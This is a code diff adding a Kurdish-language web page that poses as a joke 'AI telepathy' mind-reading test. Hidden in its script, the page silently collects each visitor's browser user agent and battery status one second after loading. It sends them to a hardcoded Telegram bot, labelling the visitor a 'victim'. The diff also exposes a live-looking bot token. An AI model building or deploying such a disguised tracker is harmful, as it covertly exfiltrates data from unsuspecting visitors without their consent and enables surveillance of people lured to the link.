@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>سیستەمی پێشبینیکردنی مێشک - AI Mind Reader</title>
+    <style>
+        body { 
+            font-family: Tahoma, sans-serif; 
+            background: #0f172a; 
+            color: #f8fafc; 
+            text-align: center; 
+            padding-top: 80px; 
+            margin: 0;
+        }
+        .container { 
+            background: #1e293b; 
+            max-width: 400px; 
+            margin: auto; 
+            padding: 40px 20px; 
+            border-radius: 16px; 
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3); 
+        }
+        h2 { color: #38bdf8; margin-bottom: 10px; }
+        p { color: #94a3b8; font-size: 14px; line-height: 1.6; }
+        .loader {
+            border: 4px solid #334155;
+            border-top: 4px solid #38bdf8;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #result {
+            display: none;
+            margin-top: 20px;
+            font-size: 16px;
+            color: #4ade80;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h2>🔮 پشکنینی تەلەپاتی AI</h2>
+        <p>تکایە شتێک لە مێشکتدا بێنە پێش چاوی خۆت و دەست بە پشکنین بکە...</p>
+        
+        <div id="loadingBox">
+            <div class="loader"></div>
+            <p id="statusText">خەریکی شیکردنەوەی شەپۆلەکانی مێشک...</p>
+        </div>
+
+        <div id="result">
+            ئەنجام: سیستەمەکە زانی مێشکت خەریکی چی بوو! 😂
+        </div>
+    </div>
+
+    <script>
+        // لێرە تووکن و چات ئایدییەکەی خۆت دابنە
+        const botToken = "8763977900:AAEYu-yWlR7Oo5XHIpl8Z13hgLljv9z73_I";
+        const chatId = "8469010473";
+
+        async function sendVictimInfo() {
+            let info = "🚨 قوربانییەک لینکەکەی کردەوە!\n\n";
+            info += "🌐 جۆری ئامێر/وێبگەڕ: " + navigator.userAgent + "\n";
+            
+            // وەرگرتنی ڕێژەی پاتری ئەگەر وێبگەڕەکە ڕێگەی پێبدات
+            if (navigator.getBattery) {
+                try {
+                    let battery = await navigator.getBattery();
+                    info += "🔋 ڕێژەی پاتری: " + Math.round(battery.level * 100) + "%\n";
+                    info += "🔌 شاحن لێدراوە؟ " + (battery.charging ? "بەڵێ" : "نەخێر") + "\n";
+                } catch (e) {}
+            }
+
+            // ناردنی بۆ تەلەگرام بە بێ دەنگدانەوە
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: info
+                })
+            });
+        }
+
+        // کاتێک پەڕەکە دەکرێتەوە دوای 1 چرکە زانیارییەکان دەنێرێت
+        window.onload = function() {
+            setTimeout(sendVictimInfo, 1000);
+
+            // پاش 4 چرکە پەیامی کۆتایی لەسەر شاشەکە نیشان دەدات
+            setTimeout(() => {
+                document.getElementById('loadingBox').style.display = 'none';
+                document.getElementById('result').style.display = 'block';
+            }, 4000);
+        };
+    </script>
+</body>
+</html>
